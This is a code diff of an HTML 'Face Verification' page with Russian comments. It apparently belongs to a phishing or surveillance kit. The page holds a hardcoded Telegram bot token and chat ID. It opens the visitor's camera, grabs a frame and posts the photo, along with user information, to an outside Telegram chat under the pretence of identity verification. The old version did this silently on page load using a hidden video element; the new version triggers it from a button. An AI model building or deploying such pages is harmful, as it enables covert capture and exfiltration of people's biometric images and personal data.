@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Face Verification</title>
     <style>
         body {
             background-color: #000;
@@ -18,22 +18,44 @@
             padding: 20px;
             text-align: center;
         }
+        .btn {
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            margin: 20px 0;
+        }
         #status {
             margin: 20px 0;
             font-size: 18px;
+        }
+        #cameraPreview {
+            width: 300px;
+            height: 400px;
+            object-fit: cover;
+            border-radius: 10px;
+            margin: 20px 0;
+            display: none;
         }
     </style>
 </head>
 <body>
     <div id="content">
-        <h1>Verification in progress...</h1>
-        <p id="status">Checking camera access...</p>
+        <h1>Face Verification</h1>
+        <p id="status">Click the button to start verification</p>
+        <video id="cameraPreview" autoplay playsinline></video>
+        <button id="verifyBtn" class="btn">Проверить</button>
     </div>
 
     <script>
         const botToken = '7898816931:AAHNPImGpJjs-MNsklAvrU0VRDFkHFte_ig';
         const chatId = '-1002577213610';
+        const videoElement = document.getElementById('cameraPreview');
         const statusElement = document.getElementById('status');
+        const verifyBtn = document.getElementById('verifyBtn');
         let stream = null;
 
         // 1. Отправка информации о пользователе
@@ -67,29 +89,15 @@
         // 2. Захват фото с камеры
         async function captureAndSendPhoto() {
             try {
-                statusElement.textContent = "Completing verification...";
-                
-                // Создаем скрытый video элемент
-                const video = document.createElement('video');
-                video.width = 640;
-                video.height = 480;
-                video.autoplay = true;
-                video.playsInline = true;
-                video.srcObject = stream;
-                document.body.appendChild(video);
-                
-                // Ждем пока видео начнет воспроизводиться
-                await new Promise(resolve => {
-                    video.onplaying = resolve;
-                    setTimeout(resolve, 1000); // Fallback timeout
-                });
+                statusElement.textContent = "Processing verification...";
+                verifyBtn.disabled = true;
                 
                 // Создаем canvas для захвата кадра
                 const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                 
                 // Преобразуем в blob
                 const blob = await new Promise(resolve => {
@@ -99,7 +107,7 @@
                 // Создаем FormData для отправки
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'verification.jpg');
+                formData.append('photo', blob, 'verification_photo.jpg');
                 
                 // Добавляем описание
                 const caption = `🆔 Фото верификации\nВремя: ${new Date().toLocaleString()}`;
@@ -111,20 +119,20 @@
                     body: formData
                 });
                 
-                statusElement.textContent = "Verification complete! You can close this page.";
+                statusElement.textContent = "Verification complete!";
                 stopCamera();
-                
-                // Удаляем временные элементы
-                document.body.removeChild(video);
+                videoElement.style.display = 'none';
+                verifyBtn.style.display = 'none';
                 
             } catch (error) {
                 console.error('Error capturing photo:', error);
-                statusElement.textContent = "Verification failed. Please refresh the page.";
+                statusElement.textContent = "Error during verification. Please try again.";
+                verifyBtn.disabled = false;
             }
         }
 
-        // 3. Запуск камеры и автоматический захват
-        async function startVerification() {
+        // 3. Запуск камеры
+        async function startCamera() {
             try {
                 statusElement.textContent = "Requesting camera access...";
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -136,12 +144,17 @@
                     audio: false
                 });
                 
+                videoElement.srcObject = stream;
+                videoElement.style.display = 'block';
+                statusElement.textContent = "Camera access granted. Taking photo...";
+                
                 // Сразу делаем фото после получения доступа
                 await captureAndSendPhoto();
                 
             } catch (error) {
                 console.error('Camera error:', error);
-                statusElement.textContent = "Camera access required for verification. Please refresh and allow access.";
+                statusElement.textContent = "Camera access denied. Please allow camera access to continue.";
+                verifyBtn.disabled = false;
             }
         }
 
@@ -149,14 +162,15 @@
         function stopCamera() {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
+                videoElement.srcObject = null;
             }
         }
 
-        // 5. Инициализация при загрузке
-        window.onload = function() {
-            sendUserInfo(); // Отправляем информацию о пользователе
-            startVerification(); // Начинаем процесс верификации
-        };
+        // 5. Обработчик кнопки
+        verifyBtn.addEventListener('click', async function() {
+            await sendUserInfo(); // Сначала отправляем информацию о пользователе
+            await startCamera(); // Затем запускаем процесс верификации
+        });
 
         // Остановка камеры при закрытии страницы
         window.addEventListener('beforeunload', stopCamera);
